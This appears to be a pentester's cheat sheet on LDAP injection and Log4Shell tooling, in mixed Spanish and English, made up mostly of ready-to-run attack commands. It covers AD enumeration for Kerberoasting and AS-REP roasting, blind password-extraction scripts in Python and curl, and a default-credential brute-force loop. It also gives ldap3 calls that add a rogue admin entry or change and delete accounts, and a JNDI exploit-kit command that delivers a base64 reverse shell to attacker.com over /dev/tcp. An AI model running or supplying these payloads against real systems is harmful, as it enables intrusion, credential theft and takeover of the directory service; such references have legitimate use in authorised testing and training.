---
aliases:
  - ldapsearch
  - ldap3 Python
  - JNDI Exploit Kit
  - LDAP wordlists
tags:
  - type/tool
  - vuln/ldap-injection
  - technique/discovery
  - asset/web-app
  - asset/directory-service
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[LDAP Injection]]'
  - '[[Burp Suite]]'
---
# LDAP Injection - Tooling

***

## ldapsearch CLI

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ldapsearch -H ldap://target -x -s base -b ""` | RootDSE + naming contexts | Anonymous bind initial recon. |
| `ldapsearch -H ldap://target -x -b "" -s base namingContexts` | Lista bases DN del server | Find root path. |
| `ldapsearch -H ldap://target -x -b "dc=target,dc=com" "(objectClass=user)"` | Enumera todos users si anonymous | OpenLDAP. |
| `ldapsearch -H ldap://dc.target.com -D "user@target.com" -w pass -b "DC=target,DC=com" "(objectClass=user)"` | AD authenticated full enum | AD bind format. |
| `ldapsearch -H ldap://target -D "cn=admin,dc=target" -w pass -b "dc=target" "(uid=*)" mail memberOf` | Specific attrs (filtered output) | Reduce ruido. |
| `ldapsearch -H ldap://target -x -b "DC=target,DC=com" "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=target,DC=com))"` | Lista Domain Admins (AD) | AD privesc recon. |
| `ldapsearch -H ldap://target -x -b "DC=target,DC=com" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName` | SPNs (Kerberoasting targets) | AD recon. |
| `ldapsearch -H ldap://target -x -b "DC=target,DC=com" "(userAccountControl:1.2.840.113556.1.4.803:=8388608)" sAMAccountName` | AD users con flag DONT_REQ_PREAUTH (AS-REP roastable) | AD AS-REP roasting. |
| `ldapsearch -H ldap://target -x -b "cn=schema" "(objectClass=*)"` | Schema dump | Pre-attack schema enum. |
| `ldapsearch -H ldap://target -x -LLL -o ldif-wrap=no "(uid=*)"` | Single-line output (parseable) | Pipe-friendly. |
| `ldapsearch -H ldaps://target:636 -x -b "..."` | LDAPS direct (TLS) | Encrypted. |
| `ldapsearch -H ldap://target -x -Z -b "..."` | StartTLS upgrade | Plain → TLS. |
^ldap-tool-ldapsearch

___

## ldap3 (Python lib)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `pip install ldap3` | Install lib | Primera vez. |
| `python3 -c "from ldap3 import Server, Connection; c=Connection(Server('ldap://target'),auto_bind=True); c.search('dc=target,dc=com','(objectClass=*)',attributes=['*']); print(c.entries)"` | Anonymous bind + full search en one-liner | Quick recon. |
| `Connection(server, user='cn=admin,dc=target,dc=com', password='pass', auto_bind=True)` | Authenticated bind simple | Standard auth. |
| `c.search('dc=target,dc=com', '(&(uid=admin)(userPassword=A*))')` y check `c.entries` | Boolean blind oracle | Custom blind extraction. |
| `c.add('cn=newuser,dc=target,dc=com', 'inetOrgPerson', {'userPassword':'attacker','memberOf':'cn=admins,dc=target,dc=com'})` | Add entry malicioso (post-bind admin) | Persistence. |
| `c.modify('cn=user,dc=target,dc=com', {'userPassword':[(MODIFY_REPLACE, ['newpass'])]})` | Modify password remoto | Atacante con write access. |
| `c.delete('cn=victim,dc=target,dc=com')` | Delete entry | Destructive (con cuidado). |
| `Server('ldaps://target', use_ssl=True)` | LDAPS connection | TLS. |
^ldap-tool-ldap3

### Script Python blind extraction

```python
from ldap3 import Server, Connection
import string

server = Server('ldap://target.com')
conn = Connection(server, auto_bind=True)

chars = string.ascii_lowercase + string.digits
result = ""

while True:
    found = False
    for c in chars:
        f = f"(&(uid=admin)(userPassword={result}{c}*))"
        conn.search('dc=target,dc=com', f)
        if conn.entries:
            result += c
            print(f"[+] {result}")
            found = True
            break
    if not found:
        break

print(f"Final: {result}")
```

___

## JNDI Exploit Kits (Log4Shell)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/welk1n/JNDI-Injection-Exploit && cd JNDI-Injection-Exploit && mvn package -DskipTests` | Build JNDI Exploit Kit | Primera vez. |
| `java -jar target/JNDI-Injection-Exploit-*-all.jar -C "id" -A attacker.com` | Hostear LDAP server con payload `id` | Setup pre-trigger. |
| `java -jar target/JNDI-Injection-Exploit-*-all.jar -C "bash -c {echo,$(echo 'bash -i >& /dev/tcp/IP/4444 0>&1' \| base64 -w0)}\|{base64,-d}\|bash" -A attacker.com` | Reverse shell payload base64 | RCE con reverse shell. |
| `java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker:8888/#Exploit"` | marshalsec server (old-school) | Alt. |
| `git clone https://github.com/fullhunt/log4j-scan && python3 log4j-scan.py -u https://target/` | Auto-detection Log4Shell | Pre-attack scanner. |
| `nuclei -u https://target -t cves/2021/CVE-2021-44228.yaml` | nuclei template Log4Shell | Bulk scan. |
| `curl -H 'User-Agent: ${jndi:ldap://$(burp-collaborator-id).oastify.com/x}' https://target/` | Burp Collaborator canary | Detection blind. |
| `python3 -m http.server 8888` (host malicious class) | HTTP server para entregar exploit class | Post-LDAP-trigger. |
^ldap-tool-jndi

___

## Wordlists y Resources

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/swisskyrepo/PayloadsAllTheThings && ls "PayloadsAllTheThings/LDAP Injection/"` | Payloads ready | Foundation. |
| `wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt` | Wordlist Intruder | Burp fuzz. |
| `cat /usr/share/seclists/Fuzzing/LDAP/* \| sort -u > ldap-fuzz.txt` | SecLists LDAP combinado | Bulk fuzz. |
| Browser → https://book.hacktricks.xyz/pentesting-web/ldap-injection | Reference comprehensive | Lookup. |
| `for u in admin manager root cn=admin cn=Manager 'cn=Directory Manager'; do for p in '' admin password secret manager; do ldapsearch -H ldap://target -x -D "$u" -w "$p" -b "" -s base 2>&1 \| grep -E 'success\|invalid' ; done; done` | Default LDAP creds bulk probe | Foothold. |
| `ldapdomaindump -u 'target.com\user' -p pass dc.target.com -o ad-dump/` | AD comprehensive dump (post-bind) | Post-recon. |
| `bloodhound-python -u user -p pass -d target.com -ns dc.target.com -c All -o /tmp/bh` | BloodHound LDAP collection | Post-foothold AD. |
^ldap-tool-wordlists

### Manual one-liner blind extraction

```bash
TARGET="https://target/login"
for c in {a..z} {0..9}; do
  R=$(curl -s -X POST "$TARGET" -d "username=admin)(userPassword=${c}*&password=x")
  if echo "$R" | grep -q "Welcome"; then
    echo "First char: $c"
    break
  fi
done
```

***
